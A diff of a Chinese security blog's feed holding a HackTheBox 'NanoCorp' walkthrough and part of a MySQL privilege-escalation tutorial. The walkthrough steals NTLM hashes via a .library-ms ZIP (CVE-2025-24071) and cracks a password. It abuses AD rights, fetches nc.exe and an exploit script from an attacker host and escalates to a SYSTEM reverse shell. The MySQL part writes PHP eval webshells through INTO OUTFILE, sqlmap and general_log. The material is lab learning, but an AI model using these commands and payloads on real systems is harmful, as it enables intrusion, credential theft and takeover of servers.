+┌──(echoin㉿kali)-[~]└─$ nmap -sV -sT 10.129.13.164 -AStarting Nmap 7.95 ( https://nmap.org ) at 2026-04-03 19:21 CSTNmap scan report for nanocorp.htb (10.129.13.164)Host is up (0.43s latency).Not shown: 987 filtered tcp ports (no-response)PORT     STATE SERVICE           VERSION53/tcp   open  domain            Simple DNS Plus80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12|_http-title: Nanocorp| http-methods: |_  Potentially risky methods: TRACE88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-04-03 18:21:59Z)135/tcp  open  msrpc             Microsoft Windows RPC139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0636/tcp  open  ldapssl?3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)3269/tcp open  globalcatLDAPssl?5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=dc01.nanocorp.htb| Subject Alternative Name: DNS:dc01.nanocorp.htb| Not valid before: 2025-04-06T22:58:43|_Not valid after:  2026-04-06T23:18:43| tls-alpn: |_  http/1.1|_http-title: Not FoundWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   3:1:1: |_    Message signing enabled and required| smb2-time: |   date: 2026-04-03T18:22:42|_  start_date: N/A|_clock-skew: 6h59m59sTRACEROUTE (using proto 1/icmp)HOP RTT       ADDRESS1   443.28 ms 10.10.14.12   443.37 ms nanocorp.htb (10.129.13.164)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 119.20 seconds
+
+
+主机名:  dc01.nanocorp.htb
+域名：nanocorp.htb0.
+协议：kerberos （88），ldap（389,3268）
+API: ssl(5986)
+AD： Microsoft Windows Active Directory
+OS: Microsoft Windows 2022|2012|2016
+这个靶机像是域控
+
+补充：
+
+
+smb2-security-mode，说明 SMB 签名被强制启用
+
+这阻止了 SMB 中继攻击，以下攻击不行
+
+SMB 中继攻击
+NTLM 中继攻击
+
+但是可以诱导出站认证、抓取 NetNTLMv2 再离线破解
+
+
+时间同步问题
+_clock-skew: 6h59m56s
+
+时间偏差近 7 小时
+用 ntpdate 同步 DC 时间
+sudo ntpdate dc01.nanocorp.htb
+
+ip写入主机：
+echo &quot;10.129.22.50 nanocorp.htb dc01.nanocorp.htb&quot; &gt;&gt; /etc/hosts
+
+访问
+
+扫目录无果，fuzz子域名
+ffuf -c -u &#x27;http://10.129.13.164/&#x27; -H &#x27;Host: FUZZ.nanocorp.htb&#x27; -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all
+
+feroxbuster -u http://10.129.13.164 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H &quot;Host: FUZZ.nanocorp.htb&quot; --filter-status 404 -t 50 -o ferox-subdomains.txt
+
+找到一个hire.nanocorp.htb的子域名
+echo &quot;10.129.13.164 nanocorp.htb hire.nanocorp.htb&quot; &gt;&gt; /etc/hosts
+
+访问http://hire.nanocorp.htb/是一个简历提交平台，可以文件上传，要上传zip
+
+找cve
+CVE-2025-24071CVE-2025-24071是Windows文件资源管理器中的一个欺骗漏洞，利用了Windows对.library-ms文件的隐式信任和自动解析特性。攻击者通过构建包含恶意SMB路径的.library-ms文件并备份为ZIP&#x2F;RAR文件，解压时，Windows资源管理器会自动尝试连接到指定的SMB服务器，从而丢失用户的NTLM Hash
+https://cti.monster/blog/2025/03/18/CVE-2025-24071.html
+https://github.com/0x6rss/CVE-2025-24071_PoC
+运行脚本得到exploit.zip
+上传文件，触发 Hash 泄露
+
+NTLMv2 Hash 窃取攻击
+怎么想到的：
+这个靶机的SMB2开着，说明可以诱导出站认证、抓取 NetNTLMv2 再离线破解。
+利用Windows 在处理某些文件格式时，会去解析里面的 UNC 路径并发起认证，从而在验证过程中拿到NTLM v2 hash。
+文件处理很可能发生在 Windows Explorer&#x2F;人工审核链路里：这就该联想到 .library-ms、.lnk、.url、.scf、UNC 之类的“强制认证”思路。这个cve用的就是 .library-ms。
+为什么要设置smb2监听，能拿到什么：
+设置 SMB2 监听，是为了拿到目标主机的一份 NetNTLMv2 认证，能拿到NetNTLMv2 挑战响应、用户名、域名、工作站名等，后续优先离线破解；若环境允许且签名没强制，再考虑 relay
+
+设置 SMB 监听器
+sudo responder -I tun0 -v
+
+通过网站上传 ZIP 文件后，Responder 成功捕获 NTLM v2 Hash：
+
+web_svc::NANOCORP:5de3a362c4704cc3:F57364639DC3F87D9F774544FACECD64:01010000000000008051591BA9C3DC011F55A9B1A5785E180000000002000800580050005100310001001E00570049004E002D0052004A004F005A0041004B005A00560030003300370004003400570049004E002D0052004A004F005A0041004B005A0056003000330037002E0058005000510031002E004C004F00430041004C000300140058005000510031002E004C004F00430041004C000500140058005000510031002E004C004F00430041004C00070008008051591BA9C3DC0106000400020000000800300030000000000000000000000000200000CC27C82FCAC1A75D66C5CA0405F415A0E0792C955F00A0B9233D96B9B409F61B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350030000000000000000000
+
+Hash 破解使用hashcat 破解
+echo &quot;web_svc::NANOCORP:418ff012261526d2:2123EE767320509AEDA1CBBDC85E913D:0101000000000000802C34C2F9C5DC01685FBBCA4C6567A20000000002000800500053004200410001001E00570049004E002D005700530041005600350034004B00300045004B00500004003400570049004E002D005700530041005600350034004B00300045004B0050002E0050005300420041002E004C004F00430041004C000300140050005300420041002E004C004F00430041004C000500140050005300420041002E004C004F00430041004C0007000800802C34C2F9C5DC0106000400020000000800300030000000000000000000000000200000DC816253D57FB1513CFE0D8B13F40EEBA3ABCBCA08FAD7375636ADA73A592F9D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003100370037000000000000000000&quot; &gt; websvc_hash.txt
+
+hashcat -m 5600 websvc_hash.txt /usr/share/wordlists/rockyou.txt
+
+得到明文密码： dksehdgh712!@#
+凭证验证域渗透神器 NetExec (nxc) 使用指南-CSDN博客
+nxc smb 10.129.243.199 -u &#x27;web_svc&#x27; -p &#x27;dksehdgh712!@#&#x27;
+
+
+（现在拿到了一个域内用户 web_svc 的凭据，但还没有拿到它的 shell；它虽然是域用户，但没有被授予可直接通过 WinRM 建立远程会话的权限，所以不能一上来就直接 WinRM 登录，所以要横向移动到一个有WinRM 链接权限的用户进行拿shell）
+
+
+bloodhound工具【免费下载】 BloodHound.py 使用教程-CSDN博客
+BloodHound项目中的SharpHound数据收集工具详解-CSDN博客
+可视化分析：内网信息收集-BloodHound分析域环境 - Yuy0ung - 博客园
+
+BloodHound &#x3D; 看图分析
+SharpHound &#x2F; BloodHound.py &#x3D; 采集数据
+Impacket &#x3D; 干活的协议工具箱
+
+
+刚进内网 &#x2F; 刚拿到域账号：常先用 Impacket 做协议层探测、认证验证、连 SMB&#x2F;LDAP&#x2F;RPC 之类。
+开始做 AD 枚举：优先上 SharpHound；如果你在 Linux&#x2F;Kali 上操作，常用 BloodHound.py &#x2F; bloodhound-python 这类 Python 采集器。
+把结果导入后分析攻击路径：用 bloodhound。
+找到可利用路径后去落地利用、横向、提权：又回到 Impacket 这类实际执行工具
+
+域内信息收集参数说明：
+
+-u：用户名
+-p：密码
+-d：域名
+-ns：DNS 服务器
+-c：收集的数据类型（例如 All 表示收集所有数据）
+
+bloodhound-python  -u &#x27;web_svc&#x27; -p &#x27;dksehdgh712!@#&#x27; -k -d nanocorp.htb -ns 10.129.243.199 -c All --zip
+
+生成域内信息zip压缩包然后kali打开bloodhound
+
+Neo4j的用户名是：neo4j,密码：P@ssword.com123！
+bloodhound的用户名：admin，密码：admin
+
+上传生成的zip,左上角搜索web_svc，右上角选择节点
+分析拓图谱
+查看web_svc账户，它对IT_SUPPORT组具有AddSelf（添加自定义权限）权限
+
+IT_SUPPORT组对MONITORING_SVC账户具有ForceChangePassword（强制更改密码）权限
+
+（思考：这个bloodhound拓扑图该怎么看，都是什么东西，之间都有什么关系，怎么利用，攻击思路应该怎么找？？？）
+
+
+攻击路径：
+利用WEB_SVC→通过IT_SUPPORT组权限→重置MONITORING_SVC密码→接管MONITORING_SVC
+
+
+已经控制了 WEB_SVC
+WEB_SVC 属于 IT_SUPPORT 组
+IT_SUPPORT 组对 MONITORING_SVC 有 ForceChangePassword 权限
+所以不需要旧密码**，直接把 MONITORING_SVC 的密码改掉
+改完以后就接管了 MONITORING_SVC 账号**
+
+横向移动Kerberos 时间同步
+Kerberos 协议要求客户端与服务器 时间差不超过 5 分钟，以防止重放攻击
+
+sudo ntpdate 10.129.243.199
+
+使用 web_svc 申请 TGT先用已知凭据向 KDC 申请 web_svc 的 Kerberos TGT
+impacket-getTGT nanocorp.htb/&#x27;web_svc&#x27;:&#x27;dksehdgh712!@#&#x27;
+
+这一步执行成功后，当前目录下会生成 web_svc.ccache（Kerberos 票据缓存文件）
+接着指定当前 shell 使用这张票据：
+export KRB5CCNAME=$(pwd)/web_svc.ccache
+
+KRB5CCNAME 表示当前要使用的 Kerberos 凭据缓存文件。 这里指定的是 web_svc.ccache，所以后续带 -k 的命令都会以 web_svc 的 Kerberos 身份 执行。
+可以先确认一下：
+klist //查看当前 Kerberos 票据缓存里的内容
+
+将 web_svc 加入 IT_SUPPORTbloodyAD -k --host dc01.nanocorp.htb -d nanocorp.htb add groupMember IT_SUPPORT web_svc
+
+这一步的作用是把 web_svc 加入 IT_SUPPORT 组，从而获得后续对 MONITORING_SVC 的控制能力。
+重置 MONITORING_SVC 的密码在 web_svc 已经具备对应权限后，可以直接重置 MONITORING_SVC 的密码：
+bloodyAD -k --host dc01.nanocorp.htb -d nanocorp.htb set password MONITORING_SVC &#x27;Abc123456@&#x27;
+
+如果这一步成功，说明 MONITORING_SVC 的新密码已经被设置为 Abc123456@
+申请 MONITORING_SVC 的 Kerberos 票据为了避免仍然沿用 web_svc 的缓存，先清理当前环境变量：
+unset KRB5CCNAME
+
+然后以新密码为 MONITORING_SVC 申请 TGT：
+kinit MONITORING_SVC@NANOCORP.HTB
+
+输入刚刚设置的新密码：
+Abc123456@
+
+再确认当前票据是否已经切换为 MONITORING_SVC：
+klist
+
+如果成功，应该能看到类似：
+Default principal: MONITORING_SVC@NANOCORP.HTB
+
+使用 WinRM 登录先把 MONITORING_SVC 的票据显式指定出来：
+export KRB5CCNAME=FILE:/home/echoin/桌面/MONITORING_SVC.ccache
+
+然后使用evil-winrm连接 WinRM：
+evil-winrm -i dc01.nanocorp.htb -r NANOCORP.HTB -S
+
+注意：
+
+这里使用WinRM，是因为目标主机开了 WinRM，且是 5986
+nmap里最关键的是这行：
+5986/tcp open  ssl/http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+这基本就说明：
+
+5986 端口开放
+跑的是 HTTP over SSL&#x2F;TLS
+这是 WinRM over HTTPS 的典型端口
+
+
+拿flag1 
+
+
+9268b3fdea83629fae1a28d5a25b56d1
+
+提权用户与组信息收集：
+本地用户：net user（列出本地用户）；net user 用户名（查看指定用户详情，含描述可能泄露密码）。本地管理员组：net localgroup administrators（找高权限用户）。域用户（需域内权限）：net user &#x2F;domain（列出所有域用户）；net user 用户名 &#x2F;domain（域用户详情）。域管理员组：net group “Domain Admins” &#x2F;domain（核心目标，获取域管列表）。
+
+
+现在所在用户：monitoring_svc
+
+所在域：nanocorp
+
+用户权限：user
+
+域管理员：Administrator
+
+域用户：Administrator，Guest，krbtgt，monitoring_svc，web_svc
+
+Administrator：域高权限账号
+
+krbtgt：Kerberos 关键账户
+
+monitoring_svc：当前已经拿到 shell 的账号
+
+web_svc：前面利用链里拿到的服务账号
+
+
+
+查找系统漏洞：
+systeminfo
+
+但是当前这个 WinRM 会话里的 monitoring_svc 没有权限执行 systeminfo.exe，或者该程序被策略拦了
+
+
+看一下靶机上运行着什么服务，找漏洞：
+查看进程Get-Process
+
+
+新发现：
+
+check_mk_agent - Check MK监控代理
+cmk-agent-ctl- Check MK代理控制服务
+
+CVE-2024-0670在2.2.0p23、2.1.0p40和2.0.0（EOL）之前，Checkmk中Windows代理插件的权限升级允许本地用户升级权限
+poc:elsevar11&#x2F;CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit：本仓库包含针对 CVE-2024-0670 的漏洞演示，该漏洞是影响 Windows 版 CheckMK Agent 的本地权限提升漏洞。该漏洞允许低权限用户通过滥用MSI修复机制处理的可写文件路径来获得SYSTEM权限。
+在目标上下载工具
+Invoke-WebRequest -Uri &quot;http://10.10.17.177:8000/RunasCs.exe&quot; -OutFile &quot;C:\Windows\Temp\RunasCs.exe&quot;Invoke-WebRequest -Uri &quot;http://10.10.17.177:8000/nc.exe&quot; -OutFile &quot;C:\Windows\Temp\nc.exe&quot;Invoke-WebRequest -Uri &quot;http://10.10.17.177:8000/exploit.ps1&quot; -OutFile &quot;C:\Windows\Temp\exploit.ps1
+
+监听：
+nc -lvnp 1111
+
+运行
+.\RunasCs.exe username &quot;password&quot; &quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1&quot;
+
+获得 SYSTEM 反向 shell
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>HTB</tag>
+        <tag>靶场</tag>
+        <tag>NanoCorp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB Three 靶场 Writeup</title>
     <url>/2026/08/24/htb-three/</url>
     <content><![CDATA[HTB-Threeecho &quot;10.129.227.248 s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts
@@ -5319,260 +5576,190 @@ cd /var/www/html/primaryecho &quot;&quot;&gt;&quot;-H&quot;   # 造一个文件�
       </tags>
   </entry>
   <entry>
-    <title>HTB NanoCorp 靶场 Writeup</title>
-    <url>/2026/08/24/htb-nanocorp/</url>
-    <content><![CDATA[nmapnmap -Pn -sT 10.129.243.199 -A
+    <title>MySQL 数据库提权（webshell + UDF）</title>
+    <url>/2026/08/24/mysql-udf-privesc/</url>
+    <content><![CDATA[权限提升：操作系统数据库姿势总结 - FreeBuf网络安全行业门户
+【权限提升】六种数据库提权&amp;口令获取-阿里云开发者社区
+数据库提权总结 - 随风kali - 博客园
+提权总结以及各种利用姿势
+提权的方法总结一、系统漏洞提权
 
-┌──(echoin㉿kali)-[~]└─$ nmap -sV -sT 10.129.13.164 -AStarting Nmap 7.95 ( https://nmap.org ) at 2026-04-03 19:21 CSTNmap scan report for nanocorp.htb (10.129.13.164)Host is up (0.43s latency).Not shown: 987 filtered tcp ports (no-response)PORT     STATE SERVICE           VERSION53/tcp   open  domain            Simple DNS Plus80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12|_http-title: Nanocorp| http-methods: |_  Potentially risky methods: TRACE88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-04-03 18:21:59Z)135/tcp  open  msrpc             Microsoft Windows RPC139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0636/tcp  open  ldapssl?3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)3269/tcp open  globalcatLDAPssl?5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=dc01.nanocorp.htb| Subject Alternative Name: DNS:dc01.nanocorp.htb| Not valid before: 2025-04-06T22:58:43|_Not valid after:  2026-04-06T23:18:43| tls-alpn: |_  http/1.1|_http-title: Not FoundWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   3:1:1: |_    Message signing enabled and required| smb2-time: |   date: 2026-04-03T18:22:42|_  start_date: N/A|_clock-skew: 6h59m59sTRACEROUTE (using proto 1/icmp)HOP RTT       ADDRESS1   443.28 ms 10.10.14.12   443.37 ms nanocorp.htb (10.129.13.164)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 119.20 seconds
+获取操作系统类型以及版本号
+根据获取的系统版本号在互联网搜索exp
+尝试利用exp获取权限
+尝试反弹shell
 
+二、数据库提权
 
-主机名:  dc01.nanocorp.htb
-域名：nanocorp.htb0.
-协议：kerberos （88），ldap（389,3268）
-API: ssl(5986)
-AD： Microsoft Windows Active Directory
-OS: Microsoft Windows 2022|2012|2016
-这个靶机像是域控
+MySQL数据库——udf提权
+数据库提权——mof提权
+数据库提权——反弹端口提权
+数据库提权——启动项提权
 
-补充：
+三、第三方软件&#x2F;服务提权
 
+通过第三方软件漏洞进行提权
+通过服务端口、服务协议漏洞进行提权
 
-smb2-security-mode，说明 SMB 签名被强制启用
+数据库权限MySQL 3306 端口弱口令爆破sqlmap 注入的 --sql-shell 模式网站的数据库配置文件中拿到明文密码信息CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限
 
-这阻止了 SMB 中继攻击，以下攻击不行
+CVE-2012-2122复现：采用shell脚本：（直接返回MySQL的shell）
+for i in `seq 1 1000`; do mysql -u root --password=bad -h 192.168.186.128 2&gt;/dev/null; done
 
-SMB 中继攻击
-NTLM 中继攻击
 
-但是可以诱导出站认证、抓取 NetNTLMv2 再离线破解
+注意该方法只适用于较低版本：
 
+其他方法：https://blog.csdn.net/weixin_43606134/article/details/107928916#:~:text=%E7%9A%84%E7%AB%AF%E5%8F%A3-,%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4,-%E6%88%91%E4%BB%AC%E7%94%A8nmap
 
-时间同步问题
-_clock-skew: 6h59m56s
+常用MySQL数据库查询语句整理：1）库与会话基础
+-- 查看当前连接信息SELECT USER(), CURRENT_USER(), DATABASE(), VERSION();-- 查看当前时间SELECT NOW(), CURDATE(), CURTIME();-- 查看所有数据库 / 选择数据库SHOW DATABASES;USE db_name;-- 查看当前库SELECT DATABASE();
 
-时间偏差近 7 小时
-用 ntpdate 同步 DC 时间
-sudo ntpdate dc01.nanocorp.htb
+2）表与结构（SHOW &#x2F; DESCRIBE）
+-- 当前库所有表SHOW TABLES;-- 查看建表语句（最有用）SHOW CREATE TABLE table_name;-- 查看字段结构DESCRIBE table_name;SHOW COLUMNS FROM table_name;-- 查看表状态SHOW TABLE STATUS LIKE &#x27;table_name&#x27;;-- 查看索引SHOW INDEX FROM table_name;-- 查看视图SHOW FULL TABLES WHERE Table_type = &#x27;VIEW&#x27;;SHOW CREATE VIEW view_name;
 
-ip写入主机：
-echo &quot;10.129.22.50 nanocorp.htb dc01.nanocorp.htb&quot; &gt;&gt; /etc/hosts
+3）information_schema 结构化查询（查库&#x2F;表&#x2F;字段&#x2F;键&#x2F;索引）
+-- 所有数据库SELECT schema_name FROM information_schema.schemata;-- 某库所有表SELECT table_nameFROM information_schema.tablesWHERE table_schema = &#x27;db_name&#x27;;-- 某表所有字段（含类型/是否可空/默认值）SELECT column_name, column_type, is_nullable, column_defaultFROM information_schema.columnsWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;ORDER BY ordinal_position;-- 主键/唯一键/普通索引（键约束层）SELECT constraint_name, constraint_typeFROM information_schema.table_constraintsWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;;-- 具体哪些列属于某个键（如 PRIMARY）SELECT constraint_name, column_nameFROM information_schema.key_column_usageWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;ORDER BY ordinal_position;-- 索引明细（更细）SELECT index_name, seq_in_index, column_name, non_uniqueFROM information_schema.statisticsWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;ORDER BY index_name, seq_in_index;
 
-访问
+4）SELECT 基础（字段、别名、去重）
+-- 查所有列/部分列SELECT * FROM table_name;SELECT col1, col2 AS alias2 FROM table_name;-- 去重SELECT DISTINCT col1 FROM table_name;-- 常用：限制返回行数SELECT * FROM table_name LIMIT 10;
 
-扫目录无果，fuzz子域名
-ffuf -c -u &#x27;http://10.129.13.164/&#x27; -H &#x27;Host: FUZZ.nanocorp.htb&#x27; -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all
+一、MySQL提权（3306）数据库提权总结 - 随风kali - 博客园
+❗（注意MySQL和Windows的版本是否能漏洞利用）
+打开MySQL： cmd
+mysql -uroot -p
 
-feroxbuster -u http://10.129.13.164 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H &quot;Host: FUZZ.nanocorp.htb&quot; --filter-status 404 -t 50 -o ferox-subdomains.txt
+1、Webshell权限into oufile 写 shell（into oufile ：把 SELECT 查询结果 由 MySQL 服务器端 写入到一个文件里）
+into oufile 写 shell要满足如下条件才可以写入
+1、知道网站物理路径2、高权限数据库用户3、load_file() 开启 即 secure_file_priv 无限制4、网站路径有写入权限
 
-找到一个hire.nanocorp.htb的子域名
-echo &quot;10.129.13.164 nanocorp.htb hire.nanocorp.htb&quot; &gt;&gt; /etc/hosts
+ 数据库查看是否有secure_file_priv 限制
+mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;+------------------+-------+| Variable_name    | Value |+------------------+-------+| secure_file_priv | NULL  |+------------------+-------+
 
-访问http://hire.nanocorp.htb/是一个简历提交平台，可以文件上传，要上传zip
 
-找cve
-CVE-2025-24071CVE-2025-24071是Windows文件资源管理器中的一个欺骗漏洞，利用了Windows对.library-ms文件的隐式信任和自动解析特性。攻击者通过构建包含恶意SMB路径的.library-ms文件并备份为ZIP&#x2F;RAR文件，解压时，Windows资源管理器会自动尝试连接到指定的SMB服务器，从而丢失用户的NTLM Hash
-https://cti.monster/blog/2025/03/18/CVE-2025-24071.html
-https://github.com/0x6rss/CVE-2025-24071_PoC
-运行脚本得到exploit.zip
-上传文件，触发 Hash 泄露
 
-NTLMv2 Hash 窃取攻击
-怎么想到的：
-这个靶机的SMB2开着，说明可以诱导出站认证、抓取 NetNTLMv2 再离线破解。
-利用Windows 在处理某些文件格式时，会去解析里面的 UNC 路径并发起认证，从而在验证过程中拿到NTLM v2 hash。
-文件处理很可能发生在 Windows Explorer&#x2F;人工审核链路里：这就该联想到 .library-ms、.lnk、.url、.scf、UNC 之类的“强制认证”思路。这个cve用的就是 .library-ms。
-为什么要设置smb2监听，能拿到什么：
-设置 SMB2 监听，是为了拿到目标主机的一份 NetNTLMv2 认证，能拿到NetNTLMv2 挑战响应、用户名、域名、工作站名等，后续优先离线破解；若环境允许且签名没强制，再考虑 relay
 
-设置 SMB 监听器
-sudo responder -I tun0 -v
+Value
+说明
 
-通过网站上传 ZIP 文件后，Responder 成功捕获 NTLM v2 Hash：
 
-web_svc::NANOCORP:5de3a362c4704cc3:F57364639DC3F87D9F774544FACECD64:01010000000000008051591BA9C3DC011F55A9B1A5785E180000000002000800580050005100310001001E00570049004E002D0052004A004F005A0041004B005A00560030003300370004003400570049004E002D0052004A004F005A0041004B005A0056003000330037002E0058005000510031002E004C004F00430041004C000300140058005000510031002E004C004F00430041004C000500140058005000510031002E004C004F00430041004C00070008008051591BA9C3DC0106000400020000000800300030000000000000000000000000200000CC27C82FCAC1A75D66C5CA0405F415A0E0792C955F00A0B9233D96B9B409F61B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350030000000000000000000
 
-Hash 破解使用hashcat 破解
-echo &quot;web_svc::NANOCORP:418ff012261526d2:2123EE767320509AEDA1CBBDC85E913D:0101000000000000802C34C2F9C5DC01685FBBCA4C6567A20000000002000800500053004200410001001E00570049004E002D005700530041005600350034004B00300045004B00500004003400570049004E002D005700530041005600350034004B00300045004B0050002E0050005300420041002E004C004F00430041004C000300140050005300420041002E004C004F00430041004C000500140050005300420041002E004C004F00430041004C0007000800802C34C2F9C5DC0106000400020000000800300030000000000000000000000000200000DC816253D57FB1513CFE0D8B13F40EEBA3ABCBCA08FAD7375636ADA73A592F9D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003100370037000000000000000000&quot; &gt; websvc_hash.txt
+NULL
+不允许导入或导出
 
-hashcat -m 5600 websvc_hash.txt /usr/share/wordlists/rockyou.txt
 
-得到明文密码： dksehdgh712!@#
-凭证验证域渗透神器 NetExec (nxc) 使用指南-CSDN博客
-nxc smb 10.129.243.199 -u &#x27;web_svc&#x27; -p &#x27;dksehdgh712!@#&#x27;
+&#x2F;
+只允许在 &#x2F; 目录导入导出
 
 
-（现在拿到了一个域内用户 web_svc 的凭据，但还没有拿到它的 shell；它虽然是域用户，但没有被授予可直接通过 WinRM 建立远程会话的权限，所以不能一上来就直接 WinRM 登录，所以要横向移动到一个有WinRM 链接权限的用户进行拿shell）
+空
+不限制目录
 
 
-bloodhound工具【免费下载】 BloodHound.py 使用教程-CSDN博客
-BloodHound项目中的SharpHound数据收集工具详解-CSDN博客
-可视化分析：内网信息收集-BloodHound分析域环境 - Yuy0ung - 博客园
 
-BloodHound &#x3D; 看图分析
-SharpHound &#x2F; BloodHound.py &#x3D; 采集数据
-Impacket &#x3D; 干活的协议工具箱
+在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
+在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
 
+①利用phpMyAdmin来into out file在phpMyAdmin中，我们可以利用log变量来猜测网站的绝对路径
 
-刚进内网 &#x2F; 刚拿到域账号：常先用 Impacket 做协议层探测、认证验证、连 SMB&#x2F;LDAP&#x2F;RPC 之类。
-开始做 AD 枚举：优先上 SharpHound；如果你在 Linux&#x2F;Kali 上操作，常用 BloodHound.py &#x2F; bloodhound-python 这类 Python 采集器。
-把结果导入后分析攻击路径：用 bloodhound。
-找到可利用路径后去落地利用、横向、提权：又回到 Impacket 这类实际执行工具
+这里是用phpstudy搭建的网站，所以猜测网站目录在WWW目录下，或者通过其他手段的信息收集，来收集到我们的网站绝对路径。
+有了网站路径，我们就可以执行SQL命令来进行写shell
+（注意：这里也要求没有secure_file_priv 限制，打开my.ini文件，加入secure_file_priv=&#39;&#39;语句再重启服务器）
+(本机的MySQL版本是5.7.26，my.ini文件已加入secure_file_priv=&#39;&#39;语句)
+select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;D:/phpstudy_pro/www/shell.php&#x27;
 
-域内信息收集参数说明：
 
--u：用户名
--p：密码
--d：域名
--ns：DNS 服务器
--c：收集的数据类型（例如 All 表示收集所有数据）
+蚁剑连：
 
-bloodhound-python  -u &#x27;web_svc&#x27; -p &#x27;dksehdgh712!@#&#x27; -k -d nanocorp.htb -ns 10.129.243.199 -c All --zip
 
-生成域内信息zip压缩包然后kali打开bloodhound
+②利用sqlmap来into out file如下（同样要求没有secure_file_priv 限制）：
+sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;C:/Users/suifeng/Desktop/shell.php&quot; --file-dest=&quot;C:/phpstudy_pro/WWW/shell.php&quot;
 
-Neo4j的用户名是：neo4j,密码：P@ssword.com123！
-bloodhound的用户名：admin，密码：admin
+利用日志写shell在MySQL 5.0 版本以上会创建日志文件，我们可以通过修改日志的全局变量中的存储位置来 getshell
+语句：
+mysql&gt;SHOW VARIABLES LIKE &#x27;%general%&#x27;;
 
-上传生成的zip,左上角搜索web_svc，右上角选择节点
-分析拓图谱
-查看web_svc账户，它对IT_SUPPORT组具有AddSelf（添加自定义权限）权限
+general_log 默认关闭，高权限的用户可以直接通过mysql命令行进行开启，开启后日志文件记录用户的每条指令，将其保存在general_log _file中。我们可以通过开启general_log ，然后自定义general_log _file来进行getshell。
+mysql&gt; set global general_log = &quot;ON&quot;;   #开启general_logmysql&gt; set global general_log_file=&#x27;c:/phpstudy_pro/www/shell.php&#x27;; #修改general_log_file路径
 
-IT_SUPPORT组对MONITORING_SVC账户具有ForceChangePassword（强制更改密码）权限
 
